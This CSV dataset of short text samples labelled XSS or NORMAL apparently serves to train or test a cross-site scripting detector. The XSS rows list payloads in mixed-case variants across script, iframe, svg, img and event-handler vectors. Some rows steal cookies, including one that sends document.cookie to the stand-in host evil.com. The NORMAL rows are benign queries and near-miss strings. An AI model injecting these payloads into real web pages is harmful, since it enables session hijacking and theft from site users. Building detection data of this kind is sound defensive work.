text,label,group_id
"<A HREF=""JAVASCRIPT:ALERT(1)"">CLICK</A>",XSS,xss_7
"<a hReF=""jAvAsCrIpT:AlErT(1)"">ClIcK</a>",XSS,xss_7
JAVASCRIPT:ALERT(DOCUMENT.COOKIE),XSS,xss_8
JaVaScRiPt:aLeRt(dOcUmEnT.CoOkIe),XSS,xss_8
javascript:alert(document.cookie),XSS,xss_8
<iFrAmE SrC=JaVaScRiPt:aLeRt(1)>,XSS,xss_9
<IFRAME SRC=JAVASCRIPT:ALERT(1)>,XSS,xss_9
<iframe src=javascript:alert(1)>,XSS,xss_9
<oBjEcT DaTa=jAvAsCrIpT:AlErT(1)>,XSS,xss_10
<OBJECT DATA=JAVASCRIPT:ALERT(1)>,XSS,xss_10
<object data=javascript:alert(1)>,XSS,xss_10
<DIV ONMOUSEOVER=ALERT(1)>HOVER</DIV>,XSS,xss_11
<div onmouseover=alert(1)>hover</div>,XSS,xss_11
<dIv oNmOuSeOvEr=aLeRt(1)>HoVeR</dIv>,XSS,xss_11
<script>fetch(document.cookie)</script>,XSS,xss_12
<SCRIPT>FETCH(DOCUMENT.COOKIE)</SCRIPT>,XSS,xss_12
<sCrIpT>FeTcH(DoCuMeNt.cOoKiE)</ScRiPt>,XSS,xss_12
"<iMg sRc=1 oNeRrOr=aLeRt(STrInG.FrOmChArCoDe(88,83,83))>",XSS,xss_13
"<IMG SRC=1 ONERROR=ALERT(STRING.FROMCHARCODE(88,83,83))>",XSS,xss_13
"<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",XSS,xss_13
<svg/onload=alert(1)>,XSS,xss_14
<sVg/oNlOaD=AlErT(1)>,XSS,xss_14
<SVG/ONLOAD=ALERT(1)>,XSS,xss_14
<marquee onstart=alert(1)>,XSS,xss_15
<MARQUEE ONSTART=ALERT(1)>,XSS,xss_15
<mArQuEe oNsTaRt=aLeRt(1)>,XSS,xss_15
<VIDEO><SOURCE ONERROR=ALERT(1)></VIDEO>,XSS,xss_16
<video><source onerror=alert(1)></video>,XSS,xss_16
<vIdEo><SoUrCe oNeRrOr=aLeRt(1)></ViDeO>,XSS,xss_16
<DETAILS OPEN ONTOGGLE=ALERT(1)>,XSS,xss_17
<details open ontoggle=alert(1)>,XSS,xss_17
<dEtAiLs oPeN OnToGgLe=aLeRt(1)>,XSS,xss_17
'-ALERT(1)-',XSS,xss_18
'-alert(1)-',XSS,xss_18
'-AlErT(1)-',XSS,xss_18
"""><SCRIPT>ALERT(1)</SCRIPT>",XSS,xss_19
"""><script>alert(1)</script>",XSS,xss_19
"""><sCrIpT>AlErT(1)</ScRiPt>",XSS,xss_19
<sCrIpT>WiNdOw.lOcAtIoN='hTtP://EvIl.cOm/sTeAl?c='+dOcUmEnT.CoOkIe</ScRiPt>,XSS,xss_20
<script>window.location='http://evil.com/steal?c='+document.cookie</script>,XSS,xss_20
<SCRIPT>WINDOW.LOCATION='HTTP://EVIL.COM/STEAL?C='+DOCUMENT.COOKIE</SCRIPT>,XSS,xss_20
<STYLE>@IMPORT 'JAVASCRIPT:ALERT(1)';</STYLE>,XSS,xss_21
<style>@import 'javascript:alert(1)';</style>,XSS,xss_21
<sTyLe>@ImPoRt 'JaVaScRiPt:aLeRt(1)';</sTyLe>,XSS,xss_21
<link rel=stylesheet href=javascript:alert(1)>,XSS,xss_22
<lInK ReL=StYlEsHeEt hReF=JaVaScRiPt:aLeRt(1)>,XSS,xss_22
<LINK REL=STYLESHEET HREF=JAVASCRIPT:ALERT(1)>,XSS,xss_22
<tAbLe bAcKgRoUnD=JaVaScRiPt:aLeRt(1)>,XSS,xss_23
<TABLE BACKGROUND=JAVASCRIPT:ALERT(1)>,XSS,xss_23
<table background=javascript:alert(1)>,XSS,xss_23
<iSiNdEx tYpE=ImAgE SrC=1 OnErRoR=AlErT(1)>,XSS,xss_24
<isindex type=image src=1 onerror=alert(1)>,XSS,xss_24
<ISINDEX TYPE=IMAGE SRC=1 ONERROR=ALERT(1)>,XSS,xss_24
best coffee near me,NORMAL,normal_0
how to reset my password,NORMAL,normal_1
search for blue shoes size 10,NORMAL,normal_2
dave@example.com,NORMAL,normal_3
carol@example.com,NORMAL,normal_3
bob@example.com,NORMAL,normal_3
alice@example.com,NORMAL,normal_3
please update my address to 123 Main St,NORMAL,normal_4
"I love this product, will buy again!",NORMAL,normal_5
7,NORMAL,normal_6
256,NORMAL,normal_6
42,NORMAL,normal_6
108,NORMAL,normal_6
what is the weather like in Hanoi today,NORMAL,normal_7
what is the weather like in Hue today,NORMAL,normal_7
what is the weather like in Ho Chi Minh City today,NORMAL,normal_7
what is the weather like in Da Nang today,NORMAL,normal_7
add item to cart,NORMAL,normal_8
checkout with credit card,NORMAL,normal_9
user dave logged in successfully,NORMAL,normal_10
user bob logged in successfully,NORMAL,normal_10
user carol logged in successfully,NORMAL,normal_10
user alice logged in successfully,NORMAL,normal_10
order number 256 has shipped,NORMAL,normal_11
order number 7 has shipped,NORMAL,normal_11
order number 42 has shipped,NORMAL,normal_11
order number 108 has shipped,NORMAL,normal_11
"great customer service, thank you",NORMAL,normal_12
how do I cancel my subscription,NORMAL,normal_13
the meeting is scheduled for 3pm tomorrow,NORMAL,normal_14
bob updated their profile picture,NORMAL,normal_15
alice updated their profile picture,NORMAL,normal_15
dave updated their profile picture,NORMAL,normal_15
carol updated their profile picture,NORMAL,normal_15
compare prices for laptops under $1000,NORMAL,normal_16
recipe for chocolate chip cookies,NORMAL,normal_17
flight from Hanoi to Singapore,NORMAL,normal_18
flight from Ho Chi Minh City to Singapore,NORMAL,normal_18
flight from Hue to Singapore,NORMAL,normal_18
flight from Da Nang to Singapore,NORMAL,normal_18
please contact support for further assistance,NORMAL,normal_19
"the product arrived damaged, requesting refund",NORMAL,normal_20
book a table for two at 7pm,NORMAL,normal_21
latest news about renewable energy,NORMAL,normal_22
how to learn TypeScript in 30 days,NORMAL,normal_23
quarterly sales report for Ho Chi Minh City branch,NORMAL,normal_24
quarterly sales report for Hanoi branch,NORMAL,normal_24
quarterly sales report for Da Nang branch,NORMAL,normal_24
quarterly sales report for Hue branch,NORMAL,normal_24
carol left a 5 star review,NORMAL,normal_25
bob left a 5 star review,NORMAL,normal_25
dave left a 5 star review,NORMAL,normal_25
alice left a 5 star review,NORMAL,normal_25
reset password link sent to your email,NORMAL,normal_26
tracking number for order 7,NORMAL,normal_27
tracking number for order 256,NORMAL,normal_27
tracking number for order 108,NORMAL,normal_27
tracking number for order 42,NORMAL,normal_27
subscribe to our monthly newsletter,NORMAL,normal_28
directions to the nearest train station,NORMAL,normal_29
please select your country from the list,NORMAL,normal_30
or would you like to unsubscribe instead,NORMAL,normal_31
the temperature is below 1 degree today,NORMAL,normal_32
5 < 10 and 10 > 5 are both true,NORMAL,normal_33
use the <b>bold</b> button to format your text,NORMAL,normal_34
"it's a great day, isn't it",NORMAL,normal_35
O'Brien confirmed the reservation for 7 guests,NORMAL,normal_36
O'Brien confirmed the reservation for 256 guests,NORMAL,normal_36
O'Brien confirmed the reservation for 42 guests,NORMAL,normal_36
O'Brien confirmed the reservation for 108 guests,NORMAL,normal_36
drop by our store this weekend for a sale,NORMAL,normal_37
insert a new payment method before checkout,NORMAL,normal_38
delete old messages to free up space,NORMAL,normal_39
the discount code is valid until 2026 -- act fast,NORMAL,normal_40
sign up for the creative writing and script workshop this friday,NORMAL,normal_41
please click <here> to continue,NORMAL,normal_42
"comment: 'nice service, 5 stars'",NORMAL,normal_43
update your notification preferences anytime,NORMAL,normal_44
